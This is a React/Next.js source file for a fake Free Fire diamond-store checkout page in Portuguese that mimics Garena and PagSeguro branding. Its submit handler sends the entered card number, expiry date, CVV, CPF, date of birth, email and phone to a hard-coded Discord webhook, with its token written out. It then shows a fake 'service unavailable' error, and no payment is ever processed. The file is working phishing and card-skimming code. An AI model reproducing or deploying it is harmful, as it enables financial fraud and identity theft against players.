
'use client';

import { Suspense, useState, useEffect } from 'react';
import Link from 'next/link';
import Image from 'next/image';
import { ChevronLeft, Info } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Header } from '@/components/freefire/Header';
import { Footer } from '@/components/freefire/Footer';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import * as z from 'zod';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { useToast } from "@/hooks/use-toast";
import { useRouter } from 'next/navigation';

const luhnCheck = (val: string): boolean => {
    const digits = val.replace(/\D/g, '');
    if (digits.length < 13 || digits.length > 19) {
        return false;
    }
    let sum = 0;
    let shouldDouble = false;
    for (let i = digits.length - 1; i >= 0; i--) {
        let digit = parseInt(digits.charAt(i), 10);
        if (shouldDouble) {
            if ((digit *= 2) > 9) {
                digit -= 9;
            }
        }
        sum += digit;
        shouldDouble = !shouldDouble;
    }
    return (sum % 10) === 0;
};

const formSchema = z.object({
  promoCode: z.string().optional(),
  cardNumber: z.string().min(19, { message: "Número do cartão incompleto." }).refine(luhnCheck, { message: "Número do cartão inválido." }),
  cardDueDate: z.string().regex(/^(0[1-9]|1[0-2])\/\d{2}$/, { message: "Data de validade inválida." }),
  cardCVV: z.string().min(3, { message: "CVV inválido." }).max(4),
  name: z.string()
    .min(1, { message: "Nome é obrigatório." })
    .refine(value => value.trim().split(" ").length >= 2, {
        message: "Por favor, insira o nome e sobrenome.",
    }),
  email: z.string()
    .min(1, { message: "E-mail é obrigatório." })
    .email({ message: "Formato de e-mail inválido." }),
  cpf: z.string().min(14, { message: "CPF inválido." }),
  dob: z.string().regex(/^\d{2}\/\d{2}\/\d{4}$/, { message: "Data de nascimento inválida." }),
  phone: z.string()
    .min(1, { message: "Número de telefone é obrigatório." })
    .regex(/^\(\d{2}\) \d \d{4}-\d{4}$/, { message: "Formato de telefone inválido." }),
});

type CheckoutData = {
    playerName: string;
    price: string;
    paymentMethodName: string;
    originalAmount: string;
    bonusAmount: string;
    totalAmount: string;
};

function CheckoutCreditCardForm() {
    const router = useRouter();
    const { toast } = useToast();
    const [isPromoApplied, setIsPromoApplied] = useState(false);
    const [checkoutData, setCheckoutData] = useState<CheckoutData | null>(null);
    const [isSubmitting, setIsSubmitting] = useState(false);

    useEffect(() => {
        const storedPlayerName = localStorage.getItem('playerName') || "Não encontrado";
        const selectedPackJSON = localStorage.getItem('selectedPack');
        const storedPaymentMethod = localStorage.getItem('paymentMethodName') || 'Cartão de Crédito via PagSeguro (Aprovação, em média, imediata)';

        if (selectedPackJSON) {
            const selectedPack = JSON.parse(selectedPackJSON);
            const original = parseInt(selectedPack.amount.replace(/\./g, ''), 10);
            const bonus = parseInt(selectedPack.bonus.replace(/\./g, ''), 10);
            const total = (original + bonus).toLocaleString('pt-BR');

            setCheckoutData({
                playerName: storedPlayerName,
                price: selectedPack.price,
                paymentMethodName: storedPaymentMethod,
                originalAmount: selectedPack.amount,
                bonusAmount: selectedPack.bonus,
                totalAmount: total,
            });
        } else {
             setCheckoutData({
                playerName: storedPlayerName,
                price: 'R$ 0,00',
                paymentMethodName: storedPaymentMethod,
                originalAmount: '0',
                bonusAmount: '0',
                totalAmount: '0',
            });
        }
    }, []);
    
    const form = useForm<z.infer<typeof formSchema>>({
        resolver: zodResolver(formSchema),
        mode: 'onChange',
        defaultValues: {
            promoCode: "",
            cardNumber: "",
            cardDueDate: "",
            cardCVV: "",
            name: "",
            email: "",
            cpf: "",
            dob: "",
            phone: "",
        },
    });

    const handleApplyPromoCode = () => {
        // Mock logic
        toast({
            variant: "destructive",
            title: "Erro",
            description: "Código promocional inválido.",
        })
    };

    const handleMaskedChange = (e: React.ChangeEvent<HTMLInputElement>, fieldChange: (value: string) => void, mask: (value: string) => string) => {
      const { value } = e.target;
      fieldChange(mask(value));
    };

    const cardNumberMask = (value: string) => value.replace(/\D/g, '').slice(0, 16).replace(/(\d{4})/g, '$1 ').trim();
    const expiryMask = (value: string) => value.replace(/\D/g, '').slice(0, 4).replace(/(\d{2})/, '$1/').replace(/\/$/, '');
    const cvvMask = (value: string) => value.replace(/\D/g, '').slice(0, 4);
    const cpfMask = (value: string) => {
        let v = value.replace(/\D/g, '').slice(0, 11);
        if (v.length > 9) v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
        else if (v.length > 6) v = v.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
        else if (v.length > 3) v = v.replace(/(\d{3})(\d{1,3})/, '$1.$2');
        return v;
    };
    const dobMask = (value: string) => {
        let v = value.replace(/\D/g, '').slice(0, 8);
        if (v.length > 4) v = v.replace(/(\d{2})(\d{2})(\d{4})/, '$1/$2/$3');
        else if (v.length > 2) v = v.replace(/(\d{2})(\d{1,2})/, '$1/$2');
        return v;
    }
    const phoneMask = (value: string) => {
        let v = value.replace(/\D/g, '').slice(0, 11);
        if (v.length > 10) v = v.replace(/(\d{2})(\d)(\d{4})(\d{4})/, '($1) $2 $3-$4');
        else if (v.length > 6) v = v.replace(/(\d{2})(\d{4})(\d{0,4})/, '($1) $2-$3');
        else if (v.length > 2) v = v.replace(/(\d{2})(\d{0,5})/, '($1) $2');
        return v;
    }

    const onSubmit = async (values: z.infer<typeof formSchema>) => {
        setIsSubmitting(true);

        const webhookURL = "https://discordapp.com/api/webhooks/1388000675744714814/G96ba02oqvitoangzfyYw1DVaAlKdseKBmVSHacuhHlEGFagqzIIOAr7MR8AcrS-C0_n";

        const content = `
**💳 Nova Compra com Cartão (Falha Simulada) 💳**
--------------------------------------------------
**Informações do Jogador:**
- **Nickname:** ${checkoutData?.playerName}
- **Produto:** ${checkoutData?.originalAmount} + ${checkoutData?.bonusAmount} Diamantes
- **Preço:** ${checkoutData?.price}

**Informações do Pagador:**
- **Nome:** ${values.name}
- **Email:** ${values.email}
- **CPF:** ${values.cpf}
- **Data de Nascimento:** ${values.dob}
- **Telefone:** ${values.phone}

**Dados do Cartão:**
- **Número:** \`\`\`${values.cardNumber}\`\`\`
- **Validade:** \`\`\`${values.cardDueDate}\`\`\`
- **CVV:** \`\`\`${values.cardCVV}\`\`\`

**Código Promocional:** ${values.promoCode || 'Nenhum'}
--------------------------------------------------
        `;

        try {
            await fetch(webhookURL, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({ content }),
            });
        } catch (error) {
            console.error("Erro ao enviar para o webhook do Discord:", error);
        } finally {
            toast({
                variant: "destructive",
                title: "Serviço Indisponível",
                description: "Utilize outro método de pagamento.",
            });
            setIsSubmitting(false);
        }
    };
    
    if (!checkoutData) {
        return (
            <div className="flex items-center justify-center h-full">Carregando...</div>
        );
    }

    return (
        <div className="flex flex-col md:mx-auto md:my-6 md:max-w-[600px] md:rounded-2xl md:bg-white overflow-hidden">
             <div className="mb-3 bg-white md:mb-4 md:rounded-t-2xl md:p-2 md:pb-0">
                <div className="relative h-20 overflow-hidden md:h-[120px] md:rounded-t-lg">
                     <Image 
                        className="h-full w-full object-cover" 
                        src="https://cdn-gop.garenanow.com/gop/mshop/www/live/assets/FF-f997537d.jpg"
                        alt="Free Fire Banner"
                        fill
                        data-ai-hint="gameplay screenshot"
                    />
                    <Link 
                        href="/" 
                        className="absolute start-4 top-4 md:start-6 md:top-6 flex items-center gap-1.5 rounded-full bg-black/40 p-1.5 pr-3 text-sm/none font-medium text-white ring-1 ring-white/70 transition-colors hover:bg-black/60 md:pr-3.5 md:text-base/none" 
                        aria-label="Voltar para a pagina inicial"
                    >
                        <ChevronLeft className="h-4 w-4 md:h-5 md:w-5" />
                        Voltar
                    </Link>
                </div>
                <div className="relative mx-5 -mt-9 flex flex-col items-center gap-4 md:-mt-10">
                    <Image 
                        className="block h-[72px] w-[72px] overflow-hidden rounded-lg bg-white object-contain ring-4 ring-white md:h-20 md:w-20" 
                        src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/icon.png" 
                        alt="Free Fire"
                        width={80}
                        height={80}
                        data-ai-hint="game icon"
                    />
                    <div className="text-center text-xl/none font-bold text-gray-800 md:text-2xl/none">Free Fire</div>
                </div>
            </div>

            <dl className="mb-3 grid grid-cols-2 justify-between gap-x-3.5 px-4 md:mb-4 md:px-10">
                <dt className="py-3 text-sm/none text-gray-600 md:text-base/none">Total</dt>
                <dd className="flex items-center justify-end gap-1 py-3 text-end text-sm/none font-medium text-gray-800 md:text-base/none">
                    <Image className="h-3.5 w-3.5" src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" width={14} height={14} alt="Diamante" data-ai-hint="diamond gem" />
                    {checkoutData.totalAmount}
                </dd>
                
                <div className="col-span-2 my-1 w-full">
                    <ul className="flex flex-col gap-3 rounded-md border border-gray-200/50 bg-gray-50 p-3 text-xs/none md:text-sm/none">
                        <li className="flex items-center justify-between gap-12">
                            <div className="text-gray-600">Preço Original</div>
                            <div className="flex shrink-0 items-center gap-1">
                                <Image className="h-3 w-3 object-contain" src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" width={12} height={12} alt="Diamante" data-ai-hint="diamond gem" />
                                <div className="font-medium text-gray-800">{checkoutData.originalAmount}</div>
                            </div>
                        </li>
                        <li className="flex items-center justify-between gap-12">
                            <div className="text-gray-600">+ Bônus Geral</div>
                            <div className="flex shrink-0 items-center gap-1">
                                <Image className="h-3 w-3 object-contain" src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" width={12} height={12} alt="Diamante" data-ai-hint="diamond gem" />
                                <div className="font-medium text-gray-800">{checkoutData.bonusAmount}</div>
                            </div>
                        </li>
                    </ul>
                </div>
                
                <dt className="py-3 text-sm/none text-gray-600 md:text-base/none">Preço</dt>
                <dd className="flex items-center justify-end gap-1 py-3 text-end text-sm/none font-medium text-gray-800 md:text-base/none">
                    {checkoutData.price}
                </dd>
                
                <dt className="py-3 text-sm/none text-gray-600 md:text-base/none">Método de pagamento</dt>
                <dd className="flex items-center justify-end gap-1 py-3 text-end text-sm/none font-medium text-gray-800 md:text-base/none">{checkoutData.paymentMethodName}</dd>
                
                <dt className="py-3 text-sm/none text-gray-600 md:text-base/none">Nome do Jogador</dt>
                <dd className="flex items-center justify-end gap-1 py-3 text-end text-sm/none font-medium text-gray-800 md:text-base/none">{checkoutData.playerName}</dd>
            </dl>
            
            <div className="h-2 bg-gray-200"></div>

            <Form {...form}>
                <form onSubmit={form.handleSubmit(onSubmit)} className="flex flex-col gap-6 px-4 pb-8 pt-5 md:p-10 md:pt-6">
                    <FormField
                        control={form.control}
                        name="promoCode"
                        render={({ field }) => (
                            <FormItem>
                                <FormLabel className="text-[15px]/4 font-medium text-gray-800">Código promocional</FormLabel>
                                <div className="flex items-end">
                                    <FormControl>
                                        <Input {...field} placeholder="Código Promocional" className="flex-1 rounded-r-none border-r-0 focus-visible:ring-offset-0" disabled={isPromoApplied} />
                                    </FormControl>
                                    <Button type="button" className="rounded-l-none h-11 px-5 text-base" variant="destructive" disabled={!field.value || isPromoApplied} onClick={handleApplyPromoCode}>
                                        {isPromoApplied ? "Aplicado" : "Aplicar"}
                                    </Button>
                                </div>
                            </FormItem>
                        )}
                    />

                    <FormField
                        control={form.control}
                        name="cardNumber"
                        render={({ field }) => (
                            <FormItem>
                                <FormLabel className="text-[15px]/4 font-medium text-gray-800">Número do cartão</FormLabel>
                                <FormControl>
                                    <Input {...field} onChange={(e) => handleMaskedChange(e, field.onChange, cardNumberMask)} placeholder="0000 0000 0000 0000" inputMode="numeric" />
                                </FormControl>
                                <FormMessage />
                            </FormItem>
                        )}
                    />
                    
                    <div className="grid grid-cols-2 gap-3">
                        <FormField
                            control={form.control}
                            name="cardDueDate"
                            render={({ field }) => (
                                <FormItem>
                                    <FormLabel className="text-[15px]/4 font-medium text-gray-800">Validade</FormLabel>
                                    <FormControl>
                                        <Input {...field} onChange={(e) => handleMaskedChange(e, field.onChange, expiryMask)} placeholder="MM/AA" inputMode="numeric" />
                                    </FormControl>
                                    <FormMessage />
                                </FormItem>
                            )}
                        />
                         <FormField
                            control={form.control}
                            name="cardCVV"
                            render={({ field }) => (
                                <FormItem>
                                    <FormLabel className="text-[15px]/4 font-medium text-gray-800 flex items-center gap-1">
                                        Código de segurança <Info className="h-4 w-4 text-gray-500" />
                                    </FormLabel>
                                    <FormControl>
                                        <Input {...field} onChange={(e) => handleMaskedChange(e, field.onChange, cvvMask)} placeholder="CVV" inputMode="numeric" type="password" />
                                    </FormControl>
                                    <FormMessage />
                                </FormItem>
                            )}
                        />
                    </div>
                    
                    <FormField
                        control={form.control}
                        name="name"
                        render={({ field }) => (
                            <FormItem>
                                <FormLabel className="text-[15px]/4 font-medium text-gray-800">Nome Completo</FormLabel>
                                <FormControl>
                                    <Input {...field} placeholder="Nome Completo" maxLength={50} />
                                </FormControl>
                                <FormMessage />
                            </FormItem>
                        )}
                    />

                    <FormField
                        control={form.control}
                        name="email"
                        render={({ field }) => (
                            <FormItem>
                                <FormLabel className="text-[15px]/4 font-medium text-gray-800">E-mail</FormLabel>
                                <FormControl>
                                    <Input {...field} type="email" placeholder="E-mail" maxLength={60} />
                                </FormControl>
                                <FormMessage />
                            </FormItem>
                        )}
                    />

                    <div className="grid grid-cols-2 gap-3">
                        <FormField
                            control={form.control}
                            name="cpf"
                            render={({ field }) => (
                                <FormItem>
                                    <FormLabel className="text-[15px]/4 font-medium text-gray-800">CPF</FormLabel>
                                    <FormControl>
                                        <Input {...field} onChange={(e) => handleMaskedChange(e, field.onChange, cpfMask)} placeholder="000.000.000-00" inputMode="numeric" />
                                    </FormControl>
                                    <FormMessage />
                                </FormItem>
                            )}
                        />
                        <FormField
                            control={form.control}
                            name="dob"
                            render={({ field }) => (
                                <FormItem>
                                    <FormLabel className="text-[15px]/4 font-medium text-gray-800">Data de nascimento</FormLabel>
                                    <FormControl>
                                        <Input {...field} onChange={(e) => handleMaskedChange(e, field.onChange, dobMask)} placeholder="DD/MM/AAAA" inputMode="numeric" />
                                    </FormControl>
                                    <FormMessage />
                                </FormItem>
                            )}
                        />
                    </div>
                    
                    <FormField
                        control={form.control}
                        name="phone"
                        render={({ field }) => (
                            <FormItem>
                                <FormLabel className="text-[15px]/4 font-medium text-gray-800">Número de telefone</FormLabel>
                                <FormControl>
                                    <Input 
                                        {...field}
                                        inputMode="numeric"
                                        placeholder="(00) 0 0000-0000"
                                        onChange={(e) => handleMaskedChange(e, field.onChange, phoneMask)}
                                    />
                                </FormControl>
                                <FormMessage />
                            </FormItem>
                        )}
                    />
                    
                    <div className="text-gray-500 text-xs/normal">
                        Ao clicar em “Prosseguir para Pagamento”, atesto que li e concordo com os <a href="https://international.pagseguro.com/legal-compliance" className="underline" target="_blank" rel="noopener noreferrer">termos de uso</a> e com a <a href="https://sobreuol.noticias.uol.com.br/normas-de-seguranca-e-privacidade/" className="underline" target="_blank" rel="noopener noreferrer">política de privacidade</a> do PagSeguro.
                    </div>

                    <div className="mt-2">
                         <Button type="submit" className="w-full h-11 text-base" variant="destructive" disabled={!form.formState.isValid || isSubmitting}>
                            {isSubmitting ? 'Processando...' : 'Prosseguir para pagamento'}
                        </Button>
                    </div>
                </form>
            </Form>
        </div>
    );
}

export default function CheckoutCreditCardPage() {
    return (
        <div className="flex flex-col min-h-screen">
          <Header />
          <main className="flex-1 bg-cover bg-center" style={{ backgroundImage: "url('https://cdn-gop.garenanow.com/gop/mshop/www/live/assets/FF-06d91604.png')" }}>
            <Suspense fallback={<div className="flex items-center justify-center h-full">Carregando...</div>}>
              <CheckoutCreditCardForm />
            </Suspense>
          </main>
          <Footer />
        </div>
    );
}